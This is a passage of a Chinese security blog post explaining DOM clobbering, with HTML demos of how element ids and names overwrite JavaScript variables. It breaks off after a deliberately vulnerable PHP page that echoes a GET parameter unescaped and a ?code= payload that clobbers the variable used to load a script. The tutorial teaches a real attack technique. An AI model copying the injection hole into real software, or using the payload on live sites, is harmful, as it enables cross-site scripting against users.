<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="前端安全—Dom Clobbering首先给出几个关键点： 1、HTML设定id之后，可以在JS中直接使用window.id来使用，或者直接使用id，JS会根据作用域规则，如果当前作用域没有就会向上寻找。 2、官方文档给出，除了id以外，embed、form、img、object这四个标签的name也具有同样特性。 3、在HTML元素利用，有两个特殊标签&lt;area&gt;和&lt;a&gt;">
<meta property="og:type" content="article">
<meta property="og:title" content="前端安全---Dom Clobbering">
<meta property="og:url" content="http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/index.html">
<meta property="og:site_name" content="m1sn0w">
<meta property="og:description" content="前端安全—Dom Clobbering首先给出几个关键点： 1、HTML设定id之后，可以在JS中直接使用window.id来使用，或者直接使用id，JS会根据作用域规则，如果当前作用域没有就会向上寻找。 2、官方文档给出，除了id以外，embed、form、img、object这四个标签的name也具有同样特性。 3、在HTML元素利用，有两个特殊标签&lt;area&gt;和&lt;a&gt;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213103326840.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213102011824.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213104520034.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213110834868.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213111701217.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213131921607.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213144438507.png">
<meta property="article:published_time" content="2021-12-15T08:49:02.000Z">
<meta property="article:modified_time" content="2022-09-30T06:23:42.924Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213103326840.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>前端安全---Dom Clobbering</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">

    
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
    <!-- jquery -->
    
<script src="/lib/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
    <div class="banner">
<div id="blogtitel" class="blogtitel">m1sn0w</div>
<ul id="wrapper" class="wrapper">
  <div class="sun">
    <div class="star"></div>
  </div>
  <div class="mercury">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="venus">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="earth">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="mars">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="jupiter">
    <div class="planet"><div class="shadow"></div></div>
  </div>
</ul>
</div>

    <div class="background">
      
        <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
        
        
        <li><a class="icon" href="/2021/12/15/PHP%20Filter%E4%BC%AA%E5%8D%8F%E8%AE%AETrick%E6%80%BB%E7%BB%93/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&text=前端安全---Dom Clobbering"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&is_video=false&description=前端安全---Dom Clobbering"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=前端安全---Dom Clobbering&body=Check out this article: http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&title=前端安全---Dom Clobbering"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/&name=前端安全---Dom Clobbering&description=&lt;h1 id=&#34;前端安全—Dom-Clobbering&#34;&gt;&lt;a href=&#34;#前端安全—Dom-Clobbering&#34; class=&#34;headerlink&#34; title=&#34;前端安全—Dom Clobbering&#34;&gt;&lt;/a&gt;前端安全—Dom Clobbering&lt;/h1&gt;&lt;p&gt;首先给出几个关键点：&lt;/p&gt;
&lt;p&gt;1、&lt;code&gt;HTML&lt;/code&gt;设定&lt;code&gt;id&lt;/code&gt;之后，可以在&lt;code&gt;JS&lt;/code&gt;中直接使用&lt;code&gt;window.id&lt;/code&gt;来使用，或者直接使用&lt;code&gt;id&lt;/code&gt;，&lt;code&gt;JS&lt;/code&gt;会根据作用域规则，如果当前作用域没有就会向上寻找。&lt;/p&gt;
&lt;p&gt;2、官方文档给出，除了&lt;code&gt;id&lt;/code&gt;以外，&lt;code&gt;embed&lt;/code&gt;、&lt;code&gt;form&lt;/code&gt;、&lt;code&gt;img&lt;/code&gt;、&lt;code&gt;object&lt;/code&gt;这四个标签的&lt;code&gt;name&lt;/code&gt;也具有同样特性。&lt;/p&gt;
&lt;p&gt;3、在&lt;code&gt;HTML&lt;/code&gt;元素利用，有两个特殊标签&lt;code&gt;&amp;lt;area&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;，在进行&lt;code&gt;toString&lt;/code&gt;方法的时候，会返回其&lt;code&gt;href&lt;/code&gt;属性的值。&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E2%80%94Dom-Clobbering"><span class="toc-number">1.</span> <span class="toc-text">前端安全—Dom Clobbering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dom-Clobbering%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Dom Clobbering介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#id%E5%B1%9E%E6%80%A7%E5%80%BC%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">id属性值的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%A0%87%E7%AD%BE%E7%9A%84name%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.2.</span> <span class="toc-text">特殊标签的name属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E6%AE%8A%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="toc-number">1.1.3.</span> <span class="toc-text">toString方法的特殊返回值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-Clobbering%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">DOM Clobbering攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">简单示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E5%B1%82%E7%BA%A7%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">多层级变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8HTML%E5%B1%82%E7%BA%A7%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">利用HTML层级标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8HTMLCollection"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">利用HTMLCollection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8iframe%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">利用iframe标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PortSwigger-lab%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.3.</span> <span class="toc-text">PortSwigger lab实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-DOM-clobbering-to-enable-XSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploiting DOM clobbering to enable XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Clobbering-DOM-attributes-to-bypass-HTML-filters"><span class="toc-number">1.3.2.</span> <span class="toc-text">Clobbering DOM attributes to bypass HTML filters</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.5.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

      
      <div class="content index width mx-auto px2 my4">
          
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        前端安全---Dom Clobbering
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">m1sn0w</span>
      </span>
      
    <div class="postdate">
        <time datetime="2021-12-15T08:49:02.000Z" itemprop="datePublished">2021-12-15</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="前端安全—Dom-Clobbering"><a href="#前端安全—Dom-Clobbering" class="headerlink" title="前端安全—Dom Clobbering"></a>前端安全—Dom Clobbering</h1><p>首先给出几个关键点：</p>
<p>1、<code>HTML</code>设定<code>id</code>之后，可以在<code>JS</code>中直接使用<code>window.id</code>来使用，或者直接使用<code>id</code>，<code>JS</code>会根据作用域规则，如果当前作用域没有就会向上寻找。</p>
<p>2、官方文档给出，除了<code>id</code>以外，<code>embed</code>、<code>form</code>、<code>img</code>、<code>object</code>这四个标签的<code>name</code>也具有同样特性。</p>
<p>3、在<code>HTML</code>元素利用，有两个特殊标签<code>&lt;area&gt;</code>和<code>&lt;a&gt;</code>，在进行<code>toString</code>方法的时候，会返回其<code>href</code>属性的值。</p>
<span id="more"></span>

<p><code>HTML</code>元素列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = [&quot;a&quot;,&quot;abbr&quot;,&quot;acronym&quot;,&quot;address&quot;,&quot;applet&quot;,&quot;area&quot;,&quot;article&quot;,&quot;aside&quot;,&quot;audio&quot;,&quot;b&quot;,&quot;base&quot;,&quot;basefont&quot;,&quot;bdi&quot;,&quot;bdo&quot;,&quot;bgsound&quot;,&quot;big&quot;,&quot;blink&quot;,&quot;blockquote&quot;,&quot;body&quot;,&quot;br&quot;,&quot;button&quot;,&quot;canvas&quot;,&quot;caption&quot;,&quot;center&quot;,&quot;cite&quot;,&quot;code&quot;,&quot;col&quot;,&quot;colgroup&quot;,&quot;command&quot;,&quot;content&quot;,&quot;data&quot;,&quot;datalist&quot;,&quot;dd&quot;,&quot;del&quot;,&quot;details&quot;,&quot;dfn&quot;,&quot;dialog&quot;,&quot;dir&quot;,&quot;div&quot;,&quot;dl&quot;,&quot;dt&quot;,&quot;element&quot;,&quot;em&quot;,&quot;embed&quot;,&quot;fieldset&quot;,&quot;figcaption&quot;,&quot;figure&quot;,&quot;font&quot;,&quot;footer&quot;,&quot;form&quot;,&quot;frame&quot;,&quot;frameset&quot;,&quot;h1&quot;,&quot;head&quot;,&quot;header&quot;,&quot;hgroup&quot;,&quot;hr&quot;,&quot;html&quot;,&quot;i&quot;,&quot;iframe&quot;,&quot;image&quot;,&quot;img&quot;,&quot;input&quot;,&quot;ins&quot;,&quot;isindex&quot;,&quot;kbd&quot;,&quot;keygen&quot;,&quot;label&quot;,&quot;legend&quot;,&quot;li&quot;,&quot;link&quot;,&quot;listing&quot;,&quot;main&quot;,&quot;map&quot;,&quot;mark&quot;,&quot;marquee&quot;,&quot;menu&quot;,&quot;menuitem&quot;,&quot;meta&quot;,&quot;meter&quot;,&quot;multicol&quot;,&quot;nav&quot;,&quot;nextid&quot;,&quot;nobr&quot;,&quot;noembed&quot;,&quot;noframes&quot;,&quot;noscript&quot;,&quot;object&quot;,&quot;ol&quot;,&quot;optgroup&quot;,&quot;option&quot;,&quot;output&quot;,&quot;p&quot;,&quot;param&quot;,&quot;picture&quot;,&quot;plaintext&quot;,&quot;pre&quot;,&quot;progress&quot;,&quot;q&quot;,&quot;rb&quot;,&quot;rp&quot;,&quot;rt&quot;,&quot;rtc&quot;,&quot;ruby&quot;,&quot;s&quot;,&quot;samp&quot;,&quot;script&quot;,&quot;section&quot;,&quot;select&quot;,&quot;shadow&quot;,&quot;slot&quot;,&quot;small&quot;,&quot;source&quot;,&quot;spacer&quot;,&quot;span&quot;,&quot;strike&quot;,&quot;strong&quot;,&quot;style&quot;,&quot;sub&quot;,&quot;summary&quot;,&quot;sup&quot;,&quot;svg&quot;,&quot;table&quot;,&quot;tbody&quot;,&quot;td&quot;,&quot;template&quot;,&quot;textarea&quot;,&quot;tfoot&quot;,&quot;th&quot;,&quot;thead&quot;,&quot;time&quot;,&quot;title&quot;,&quot;tr&quot;,&quot;track&quot;,&quot;tt&quot;,&quot;u&quot;,&quot;ul&quot;,&quot;var&quot;,&quot;video&quot;,&quot;wbr&quot;,&quot;xmp&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="Dom-Clobbering介绍"><a href="#Dom-Clobbering介绍" class="headerlink" title="Dom Clobbering介绍"></a><code>Dom Clobbering</code>介绍</h2><p>​    修改<code>HTML</code>元素，来影响<code>JavaScript</code>代码行为。</p>
<p>​    依次来解释一下上面给出的三个关键点：</p>
<h3 id="id属性值的影响"><a href="#id属性值的影响" class="headerlink" title="id属性值的影响"></a><code>id</code>属性值的影响</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 给出一个示例代码</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 id=&quot;m1sn0w&quot;&gt;hello world&lt;/h1&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        console.log(m1sn0w);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器控制台会输出<code>&lt;h1 id=&quot;m1sn0w&quot;&gt;hello world&lt;/h1&gt;</code>，这也就说明，一个<code>HTML</code>标签的<code>id</code>属性值，会影响到<code>JS</code>中的变量。</p>
<h3 id="特殊标签的name属性"><a href="#特殊标签的name属性" class="headerlink" title="特殊标签的name属性"></a>特殊标签的<code>name</code>属性</h3><p>前面提到过<code>embed</code>、<code>form</code>、<code>img</code>、<code>object</code>这四个特殊标签，除了上面所说的，<code>id</code>属性值会影响<code>JS</code>中的变量外，这四个特殊标签的<code>name</code>属性值，也可以影响<code>JS</code>中相应的变量值，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 id=&quot;m1sn0w&quot;&gt;hello world&lt;/h1&gt;</span><br><span class="line">    &lt;embed name=&quot;m1sn0w1&quot;/&gt;</span><br><span class="line">    &lt;form name=&quot;m1sn0w2&quot; &gt;&lt;/form&gt;</span><br><span class="line">    &lt;img name=&quot;m1sn0w3&quot; /&gt;</span><br><span class="line">    &lt;object name=&quot;m1sn0w4&quot; &gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        console.log(m1sn0w);</span><br><span class="line">        console.log(m1sn0w1);</span><br><span class="line">        console.log(m1sn0w2);</span><br><span class="line">        console.log(m1sn0w3);</span><br><span class="line">        console.log(m1sn0w4);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213103326840.png" alt="image-20211213103326840"></p>
<p>通过控制上面的元素属性，可以用来覆盖掉<code>JS</code>中的变量，从而影响<code>JS</code>的行为。</p>
<p>HTML 的说明文档也有相关明确定义， <a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=YDLzgWf9G18UTnLYorqEZw==.aWeo4An6XZqgX3J7IXNQDROvyBeoBXoL7R1VbRdKDXmycZpSWhuZrvRmLUC3zInFZ6ZMnmwTw9TkdKi8zpNlm0QuAL6oxSxRAI+pyk9gYpew+LdPumy0T2rzmm9pUHjs">7.3.3 Named access on the Window object</a>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213102011824.png" alt="image-20211213102011824"></p>
<h3 id="toString方法的特殊返回值"><a href="#toString方法的特殊返回值" class="headerlink" title="toString方法的特殊返回值"></a><code>toString</code>方法的特殊返回值</h3><p>​    前面说到，<code>id</code>属性值可以影响<code>JS</code>的相应变量值，当在<code>JS</code>中，将一个标签对象当成字符串处理的时候，会调用这个对象的<code>toString</code>方法。在<code>HTML</code>标签元素中，存在两个特殊的标签，即<code>&lt;a&gt;</code>和<code>&lt;area&gt;</code>标签。当在<code>JS</code>中调用这两个标签元素对应对象的<code>toString</code>方法的时候，会返回其<code>href</code>属性值。例如：<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=bdY1PO9eKAnrYh2v2DWpLw==.1IUJb2XkEQ2CEg2pLRmr79SdM1MxeV2T86bS174SeGTycKdQojvKG6D5RhUfkQUI9uE5HVQ13jzmIF2+YrghAQ==">4.6.3 API for a and area elements</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; href=&quot;http://www.baidu.com/&quot;&gt;</span><br><span class="line">    &lt;area id=&quot;m1sn0w1&quot; href=&quot;http://www.m1sn0w.top&quot; &gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        console.log(m1sn0w + &#x27;&#x27;);</span><br><span class="line">        console.log(m1sn0w1 + &#x27;&#x27;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213104520034.png" alt="image-20211213104520034"></p>
<p>​    除此之外，<code>base</code>标签也可以和<code>a</code>标签组合使用，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;file://ftp/&quot;&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; href=&quot;aaa&quot;&gt;</span><br><span class="line">&lt;/base&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    console.log(m1sn0w + &quot;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    结果会输出<code>file://ftp/aaa</code>，也就是，可以在<code>base</code>的<code>href</code>上设置协议以及路径，然后在<code>a</code>标签中设置字符串，返回的结果就会进行一个拼接。</p>
<h2 id="DOM-Clobbering攻击"><a href="#DOM-Clobbering攻击" class="headerlink" title="DOM Clobbering攻击"></a><code>DOM Clobbering</code>攻击</h2><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p><code>DOM Clobbering</code>的攻击场景，是需要存在一个输入的地方，将用户输入的标签字符串能转换成<code>HTML</code>标签。（其实也就是<code>XSS</code>）</p>
<p>假设有这样一个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># index.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        echo $_GET[&#x27;code&#x27;];</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    if (m1sn0w) &#123;</span><br><span class="line">      var script = document.createElement(&#x27;script&#x27;)</span><br><span class="line">      script.src = value</span><br><span class="line">      document.body.appendChild(script)</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>除了直接进行<code>XSS</code>攻击之外，还可以通过覆盖<code>JS</code>变量值来进行攻击。</p>
<p>首先传入以下这个字符串，看看页面会发生什么变化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;h id=&quot;m1sn0w&quot;&gt;&lt;a id=&quot;value&quot; href=&quot;m1sn0w&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213110834868.png" alt="image-20211213110834868"></p>
